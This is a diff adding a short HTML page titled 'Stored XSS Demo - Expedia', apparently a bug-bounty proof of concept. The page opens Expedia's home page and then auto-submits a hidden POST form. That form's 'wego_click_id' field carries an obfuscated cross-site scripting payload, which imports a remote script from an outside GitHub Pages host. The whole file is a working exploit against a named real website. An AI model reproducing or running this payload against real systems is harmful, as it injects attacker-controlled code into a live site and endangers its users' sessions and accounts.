@@ -1,0 +1,45 @@
+<!doctype html>
+<html>
+<head>
+  <title>Expedia XSS Demo</title>
+</head>
+<body>
+  <h3>Stored XSS Demo - Expedia</h3>
+
+  <script>
+      const testUrl = "https://www.expedia.com/web/home.aspx";
+      console.log("Step 1: Opening Expedia...");
+      const childWindow = window.open(testUrl, "_blank");
+
+      if (!childWindow) {
+        alert("Popup blocked!");
+      }
+
+      // Step 2: After 5 sec, open a POST submission window
+      setTimeout(() => {
+        console.log("Step 2: Submitting form via window.open...");
+
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.action = testUrl;
+        form.target = "_blank"; // open in a new tab
+        form.style.display = "none";
+
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = "wego_click_id";
+        input.value = '--><details open="&quot;x&quot;"ontogglE=/*x\42\70*/import(`//bug-vs-me.github.io/xss.js`)><!--';
+        form.appendChild(input);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        // Step 3: After 8 sec, load home page in parent
+        setTimeout(() => {
+          console.log("Step 3: Loading Expedia in parent window...");
+          window.location.href = testUrl;
+        }, 2000);
+      }, 8000);
+  </script>
+</body>
+</html>
